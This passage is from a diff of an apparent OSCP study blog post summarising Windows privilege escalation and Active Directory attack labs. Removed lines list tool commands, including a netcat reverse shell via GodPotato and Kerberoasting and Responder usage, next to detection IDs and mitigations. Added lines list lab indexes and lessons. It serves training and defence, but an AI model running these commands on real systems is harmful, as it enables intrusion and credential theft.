+| **Windows PrivEsc** | local shell | Writable script + SYSTEM scheduler | [→](/posts/thm-windows-privesc/) |
+| **Windows PrivEsc Arena** | RDP | Service misconfig / AlwaysInstallElevated / unquoted path | [→](/posts/thm-windows-privesc-arena/) |
+| **Alfred** | Jenkins default cred | SeImpersonate → PrintSpoofer | [→](/posts/thm-alfred/) |
+| **Corp** | local RDP | Kerberoasting + Unattend.xml | [→](/posts/thm-corp/) |
+| **Retro** | WordPress cred → RDP | Kernel exploit | [→](/posts/thm-retro/) |
+| **Steel Mountain** | Rejetto HFS CVE | Service misconfiguration | [→](/posts/thm-steel-mountain/) |
+| **HackPark** | Web brute force | (see writeup) | [→](/posts/thm-hackpark/) |
+| **Blaster** | (see writeup) | (see writeup) | [→](/posts/thm-blaster/) |
+| **Holo** | (see writeup) | (see writeup) | [→](/posts/thm-holo/) |
+| **Stealth** | (see writeup) | (see writeup) | [→](/posts/thm-stealth/) |
+| **Attacking Kerberos** | Kerberos attacks | AD lab | [→](/posts/thm-attacking-kerberos/) |
+| **Attacktive Directory** | AD lab | AD lab | [→](/posts/thm-attacktive-directory/) |
 
-### Pattern D — AS-REP Roast → BloodHound → DCSync
+### Related TechBlog Posts
 
-```mermaid
-flowchart LR
-    A[User enumeration via LDAP/enum4linux] --> B[AS-REP Roast - no preauth]
-    B --> C[Crack hash → service account]
-    C --> D[BloodHound ACL analysis]
-    D --> E[WriteDACL / GenericAll abuse]
-    E --> F[DCSync → All hashes → Domain Admin]
-```
-*Representative: HTB Forest*
-
----
-
-## Tooling Reference
-
-| Tool | Purpose | Key Usage |
-|------|---------|-----------|
-| **winPEAS** | Local enumeration | `.\winPEASx64.exe` |
-| **GodPotato** | SeImpersonate → SYSTEM | `.\GodPotato.exe -cmd "nc.exe $IP 4444 -e cmd"` |
-| **PrintSpoofer** | SeImpersonate → SYSTEM | `.\PrintSpoofer64.exe -i -c cmd` |
-| **accesschk.exe** | Service/file ACL checks | `accesschk.exe /accepteula -uwcqv "Users" *` |
-| **GetUserSPNs.py** | Kerberoasting | `python3 GetUserSPNs.py -request -dc-ip $ip DOMAIN/user:pass` |
-| **GetNPUsers.py** | AS-REP Roasting | `python3 GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt` |
-| **BloodHound** | AD ACL path mapping | `bloodhound-python -d DOMAIN -u user -p pass -c All` |
-| **evil-winrm** | WinRM shell | `evil-winrm -i $ip -u user -p pass` |
-| **hashcat** | Offline hash cracking | `-m 13100` (Kerberoast), `-m 18200` (AS-REP), `-m 5600` (NetNTLMv2) |
-| **responder** | NTLM capture | `sudo responder -I tun0 -v` |
-| **gpp-decrypt** | GPP cpassword decrypt | `gpp-decrypt "<cpassword>"` |
-| **msfvenom** | Payload generation | `-f msi`, `-f dll`, `-f exe` |
+| Post | Link |
+|------|------|
+| Windows Potato PrivEsc Guide (GodPotato → Hot Potato) | [→](/posts/tech-windows-potato-privesc/) |
+| PsExec Lateral Movement | [→](/posts/tech-psexec-lateral-movement/) |
+| NTLM Relay (ntlmrelayx) | [→](/posts/tech-ntlmrelayx-attack-guide/) |
+| Kerberoasting (GetUserSPNs) | [→](/posts/tech-getuserspns-kerberoasting/) |
+| RBCD Attack | [→](/posts/tech-rbcd-attack-guide/) |
+| AD CS / Certipy | [→](/posts/tech-certipy-adcs-attack/) |
 
 ---
 
-## Detection & Blue Team Indicators
+## 5 OSCP Lessons from This Dataset
 
-### Windows Event IDs to Monitor
+1. **searchsploit after every banner grab.** Bratarina was solved by `nc $ip 25` → version → searchsploit → public exploit. This three-step pattern repeats constantly.
 
-| Event ID | Description | Technique |
-|----------|-------------|-----------|
-| 4648 | Explicit credential logon | Token abuse, lateral movement |
-| 4672 | Special privileges at logon | SeImpersonate abuse |
-| 4688 | New process created | Watch for cmd.exe spawned by service accounts |
-| 4769 | Kerberos service ticket requested | Kerberoasting (RC4 downgrade = `0x17`) |
-| 4768 | Kerberos AS request | AS-REP Roasting (no preauth) |
-| 7045 | New service installed | Service creation for persistence/privesc |
+2. **LFI is not just `/etc/passwd`.** Clue and Apex demonstrate that LFI into `/proc/self/cmdline`, app config files, and service configs extracts credentials far more reliably.
 
-### Mitigations
+3. **chisel for internal service tunneling.** Craft2 required tunneling MySQL from the victim. Knowing the `server/client` chisel syntax and reverse port-forward notation is mandatory.
 
-```powershell
-# 1. Remove unnecessary SeImpersonatePrivilege
-#    Use gMSA or Virtual Service Accounts instead of domain/local accounts for services
+4. **NTLM capture via Responder is a reliable opening move.** Any Windows host that can be made to fetch a file emits NTLMv2. Craft2 shows ODF documents as the trigger.
 
-# 2. Require Kerberos preauthentication on all accounts
-#    (removes AS-REP Roasting attack surface)
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADAccountControl -DoesNotRequirePreAuth $false
-
-# 3. Use strong, unique passwords for service accounts (25+ chars)
-#    Rotate regularly, monitor TGS requests for RC4 downgrade
-
-# 4. Audit writable paths in scheduled task / service configurations
-icacls "C:\path\to\script.ps1"
-
-# 5. Disable AlwaysInstallElevated
-reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
-reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
-```
-
----
-
-## Writeup Reference Index
-
-| Writeup | Platform | Primary PrivEsc Technique | Link |
-|---------|----------|--------------------------|------|
-| Windows PrivEsc | TryHackMe | Writable script + scheduled task → SYSTEM | [→](/posts/thm-windows-privesc/) |
-| Windows PrivEsc Arena | TryHackMe | Service misconfig, AlwaysInstallElevated, unquoted path | [→](/posts/thm-windows-privesc-arena/) |
-| Alfred | TryHackMe | Jenkins weak cred → SeImpersonate → PrintSpoofer | [→](/posts/thm-alfred/) |
-| Corp | TryHackMe | Kerberoasting → Unattend.xml stored creds | [→](/posts/thm-corp/) |
-| Retro | TryHackMe | WordPress cred reuse → RDP → kernel exploit | [→](/posts/thm-retro/) |
-| Steel Mountain | TryHackMe | Rejetto HFS CVE → service misconfig | [→](/posts/thm-steel-mountain/) |
-| Active | HackTheBox | SMB null → GPP cpassword → Kerberoasting → Domain Admin | [→](/posts/htb-active/) |
-| Forest | HackTheBox | enum4linux → AS-REP Roast → BloodHound → DCSync | [→](/posts/htb-forest/) |
-| Craft2 | Proving Grounds | Bad-ODF NTLM capture → CVE-2020-1337 → SYSTEM | [→](/posts/pg-craft2/) |
-| Potato PrivEsc Guide | TechBlog | Full Potato family reference (GodPotato → Hot Potato) | [→](/posts/tech-windows-potato-privesc/) |
-
----
-
-## Key Takeaways
-
-1. **Always check `whoami /priv` first.** SeImpersonatePrivilege is the single most reliable path to SYSTEM on any Windows host running web/database services.
-
-2. **In AD environments, enumerate SPNs before anything else.** If a service account has an SPN and a weak password, Kerberoasting gives you credentials that may be reused across the domain.
-
-3. **Anonymous SMB and SYSVOL access are high-value.** Groups.xml files containing GPP cpasswords and deployment files like Unattend.xml represent credential exposure that persists for years.
-
-4. **winPEAS + BloodHound is the standard toolkit.** winPEAS covers local misconfiguration; BloodHound maps the AD attack surface. Running both immediately after initial access is the most efficient approach.
-
-5. **Scheduled tasks and services must be verified in context.** A writable file is worthless unless it is executed by a privileged account. Always confirm the execution context and trigger frequency.
+5. **SeImpersonatePrivilege is almost always present on web/database service shells.** Check it first. GodPotato works on everything from Server 2012 to Windows 11.
 
 ---
 
 ## References
 
-- [TryHackMe - Windows PrivEsc](https://tryhackme.com/room/windows10privesc)
-- [TryHackMe - Windows PrivEsc Arena](https://tryhackme.com/room/windowsprivesc20)
-- [Windows Potato PrivEsc (this blog)](/posts/tech-windows-potato-privesc/)
 - [Potatoes Windows Privesc — Jorge Lajara](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
 - [GodPotato](https://github.com/BeichenDream/GodPotato)
 - [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
@@ -520,3 +536,7 @@ reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEleva
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 - [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 - [Impacket](https://github.com/fortra/impacket)
+- [chisel](https://github.com/jpillora/chisel)
+- [CVE-2020-7247 (OpenSMTPD)](https://nvd.nist.gov/vuln/detail/CVE-2020-7247)
+- [CVE-2020-1337 (WerTrigger)](https://nvd.nist.gov/vuln/detail/CVE-2020-1337)
+- [CVE-2018-17179 (OpenEMR)](https://nvd.nist.gov/vuln/detail/CVE-2018-17179)
